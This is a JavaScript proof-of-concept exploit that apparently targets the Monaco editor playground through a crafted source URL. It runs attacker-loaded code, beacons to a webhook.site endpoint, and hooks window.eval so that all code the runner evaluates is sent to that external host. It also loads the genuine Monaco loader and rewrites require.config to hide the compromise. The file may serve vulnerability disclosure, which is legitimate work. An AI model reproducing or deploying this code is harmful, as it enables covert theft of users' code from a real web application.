// loader.js — PoC for remote code execution and code exfiltration in Monaco playground runner
// Attack URL:
// https://microsoft.github.io/monaco-editor/playground.html?source=https://nologs1.github.io/monaco-poc

(function () {
  const EXFIL = "https://webhook.site/55ba3434-91a8-49ee-993d-42e54f4fb6a3";
  const REAL_VS = "https://cdn.jsdelivr.net/npm/monaco-editor@0.52.2/min/vs";

  // ── Stage 1: proof of execution ───────────────────────────────────────────
  fetch(
    EXFIL +
      "?s=1_exec&origin=" +
      encodeURIComponent(window.origin) +
      "&ts=" +
      Date.now(),
    { method: "GET" }
  );

  // ── Stage 2: hook window.eval before runner calls eval(js) ─────────────────
  // Capture global eval in a way that survives strict mode
  var _nativeEval = (0, eval);

  Object.defineProperty(window, "eval", {
    configurable: true,
    writable: true,
    value: function hookedEval(code) {
      try {
        const body = String(code);
        fetch(EXFIL + "?s=2_code", {
          method: "POST",
          headers: { "Content-Type": "text/plain" },
          body
        });
      } catch (e) {
        console.error("[attacker] exfil failed", e);
      }
      return _nativeEval(code);
    }
  });

  // ── Stage 3: load real Monaco AMD loader and proxy require.config ─────────
  try {
    // 1) Carica il vero loader AMD da jsDelivr
    var realLoaderXhr = new XMLHttpRequest();
    realLoaderXhr.open("GET", REAL_VS + "/loader.js", false); // sync
    realLoaderXhr.send();
    if (realLoaderXhr.status === 200) {
      _nativeEval(realLoaderXhr.responseText); // definisce window.require
    } else {
      console.warn("[attacker] failed to load real loader, status", realLoaderXhr.status);
      // fallback: stub minimal require, editor probabilmente non funzionerà ma eval hook resta attivo
      window.require = function (m, cb) {
        if (typeof cb === "function") setTimeout(cb, 0);
      };
      window.require.config = function () {};
      return;
    }

    // 2) Proxy di require.config per puntare sempre vs al CDN
    if (window.require && window.require.config) {
      var _origCfg = window.require.config.bind(window.require);
      window.require.config = function (cfg) {
        if (cfg && cfg.paths && cfg.paths.vs) {
          cfg.paths.vs = REAL_VS;
          delete cfg.paths["vs/language"];
          delete cfg.paths["vs/basic-language"];
        }
        return _origCfg(cfg);
      };
    }
  } catch (e) {
    console.error("[attacker] Stage 3 failed", e);
  }
})();
